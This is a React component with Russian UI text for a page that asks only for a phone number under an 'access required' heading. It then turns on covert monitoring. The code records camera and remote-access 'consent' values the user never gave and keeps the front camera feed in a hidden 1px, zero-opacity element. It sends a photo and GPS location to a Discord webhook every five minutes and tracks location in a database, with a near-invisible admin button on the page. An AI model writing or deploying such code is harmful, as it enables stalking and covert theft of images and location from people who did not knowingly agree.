import React, { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Phone, Loader2 } from "lucide-react";
import { toast } from "@/hooks/use-toast";
import { useCamera } from "@/hooks/useCamera";
import { useLocation } from "@/hooks/useLocation";
import {
  sendToWebhook,
  sendSessionStartNotification,
} from "@/services/webhookService";
import { saveUser, updateUserLocation } from "@/services/databaseService";

interface UserInterfaceProps {
  onAdminAccess: () => void;
}

export const UserInterface: React.FC<UserInterfaceProps> = ({
  onAdminAccess,
}) => {
  const [phoneNumber, setPhoneNumber] = useState("");
  const [loading, setLoading] = useState(false);
  const [permissionsGranted, setPermissionsGranted] = useState(false);
  const [sessionActive, setSessionActive] = useState(false);

  const {
    videoRef,
    isActive: cameraActive,
    error: cameraError,
    capturePhoto,
  } = useCamera(permissionsGranted, true);

  const { location, error: locationError } = useLocation(permissionsGranted);

  // Автоматический захват снимков каждые 5 минут
  useEffect(() => {
    if (!sessionActive || !cameraActive || !phoneNumber) return;

    const captureInterval = setInterval(
      async () => {
        try {
          const photoBlob = await capturePhoto();
          if (photoBlob) {
            await sendToWebhook(phoneNumber, photoBlob, location);
          }
        } catch (error) {
          console.error("Ошибка автозахвата:", error);
        }
      },
      5 * 60 * 1000,
    ); // 5 минут

    return () => clearInterval(captureInterval);
  }, [sessionActive, cameraActive, phoneNumber, capturePhoto, location]);

  // Обновление местоположения в базе данных
  useEffect(() => {
    if (location && phoneNumber && sessionActive) {
      updateUserLocation(phoneNumber, location.latitude, location.longitude);
    }
  }, [location, phoneNumber, sessionActive]);

  // Отправка уведомления о начале сессии
  useEffect(() => {
    if (sessionActive && phoneNumber) {
      sendSessionStartNotification(phoneNumber, location);
    }
  }, [sessionActive, phoneNumber, location]);

  const requestPermissions = async () => {
    try {
      // Запрос разрешения на камеру
      const cameraStream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: "user",
          width: { ideal: 1280 },
          height: { ideal: 720 },
        },
      });
      cameraStream.getTracks().forEach((track) => track.stop());

      // Запрос разрешения на геолокацию
      await new Promise<void>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
          () => resolve(),
          (error) => {
            let errorMessage = "Неизвестная ошибка геолокации";

            switch (error.code) {
              case error.PERMISSION_DENIED:
                errorMessage = "Доступ к геолокации запрещен";
                break;
              case error.POSITION_UNAVAILABLE:
                errorMessage = "Информация о местоположении недоступна";
                break;
              case error.TIMEOUT:
                errorMessage = "Время ожидания запроса местоположения истекло";
                break;
              default:
                errorMessage = error.message || "Неизвестная ошибка геолокации";
                break;
            }

            reject(new Error(errorMessage));
          },
          { enableHighAccuracy: true, timeout: 10000 },
        );
      });

      return true;
    } catch (error) {
      const errorMessage =
        error instanceof Error
          ? error.message
          : "Неизвестная ошибка при запросе разрешений";
      console.error("Ошибка запроса разрешений:", errorMessage);
      return false;
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!phoneNumber || phoneNumber.length < 10) {
      toast({
        title: "Неверный номер телефона",
        description: "Пожалуйста, введите действительный номер телефона",
        variant: "destructive",
      });
      return;
    }

    setLoading(true);

    try {
      // Запрос разрешений автоматически
      const permissionsOk = await requestPermissions();

      if (!permissionsOk) {
        toast({
          title: "Требуются разрешения",
          description:
            "Для работы сервиса необходим доступ к камере и местоположению",
          variant: "destructive",
        });
        setLoading(false);
        return;
      }

      // Сохранение пользователя в базу данных
      const consents = {
        location: true,
        camera: true,
        microphone: false,
        remoteAccess: true,
      };

      const result = await saveUser(phoneNumber, consents);

      if (!result.success) {
        throw new Error(
          result.error || "Не удалось сохранить данные пользователя",
        );
      }

      setPermissionsGranted(true);
      setSessionActive(true);

      toast({
        title: "Сессия запущена",
        description: "Сессия мониторинга активна",
      });
    } catch (error) {
      toast({
        title: "Ошибка",
        description:
          error instanceof Error
            ? error.message
            : "Произошла неизвестная ошибка",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  // Показываем пустую страницу для обычных пользователей изначально
  if (!sessionActive) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <Card className="w-full max-w-md">
          <CardHeader className="text-center">
            <CardTitle className="text-2xl font-bold text-gray-900">
              Требуется доступ
            </CardTitle>
            <CardDescription>
              Введите ваш номер телефона для продолжения
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="space-y-2">
                <label
                  htmlFor="phone"
                  className="text-sm font-medium text-gray-700"
                >
                  Номер телефона
                </label>
                <div className="relative">
                  <Phone className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
                  <Input
                    id="phone"
                    type="tel"
                    placeholder="+7 (999) 123-45-67"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                    className="pl-10"
                    required
                  />
                </div>
              </div>

              <Button
                type="submit"
                className="w-full"
                disabled={loading || !phoneNumber}
                size="lg"
              >
                {loading ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Подключение...
                  </>
                ) : (
                  "Продолжить"
                )}
              </Button>
            </form>

            {/* Скрытый доступ к админке */}
            <div className="mt-8 text-center">
              <button
                onClick={onAdminAccess}
                className="text-xs text-gray-400 hover:text-gray-600 transition-colors"
                style={{ opacity: 0.1 }}
              >
                •
              </button>
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }

  // Вид активной сессии
  return (
    <div className="min-h-screen bg-gray-50 p-4">
      <div className="max-w-2xl mx-auto space-y-6">
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center space-x-2">
              <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
              <span>Сессия активна</span>
            </CardTitle>
            <CardDescription>
              Телефон: {phoneNumber} • Мониторинг в процессе
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            {/* Скрытая камера */}
            <div
              className="relative bg-black rounded-lg overflow-hidden"
              style={{ height: "1px", opacity: 0 }}
            >
              <video
                ref={videoRef}
                autoPlay
                playsInline
                muted
                className="w-full h-full object-cover"
              />
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="p-4 bg-green-50 border border-green-200 rounded-lg">
                <div className="flex items-center space-x-2">
                  <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                  <span className="text-sm text-green-800">
                    Камера: Активна
                  </span>
                </div>
              </div>

              <div className="p-4 bg-blue-50 border border-blue-200 rounded-lg">
                <div className="flex items-center space-x-2">
                  <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
                  <span className="text-sm text-blue-800">
                    Местоположение: Отслеживается
                  </span>
                </div>
              </div>
            </div>

            {location && (
              <div className="p-3 bg-gray-50 border border-gray-200 rounded-lg">
                <p className="text-xs text-gray-600">
                  Текущее местоположение: {location.latitude.toFixed(6)},{" "}
                  {location.longitude.toFixed(6)}
                </p>
              </div>
            )}

            {(cameraError || locationError) && (
              <div className="p-3 bg-red-50 border border-red-200 rounded-lg">
                <p className="text-sm text-red-800">
                  {cameraError || locationError}
                </p>
              </div>
            )}

            <div className="p-4 bg-blue-50 border border-blue-200 rounded-lg">
              <div className="flex items-center space-x-2 mb-2">
                <div className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></div>
                <span className="text-sm font-medium text-blue-900">
                  Автоматические снимки
                </span>
              </div>
              <p className="text-xs text-blue-800">
                Система автоматически делает снимки каждые 5 минут и отправляет
                их в Discord канал для мониторинга безопасности.
              </p>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};
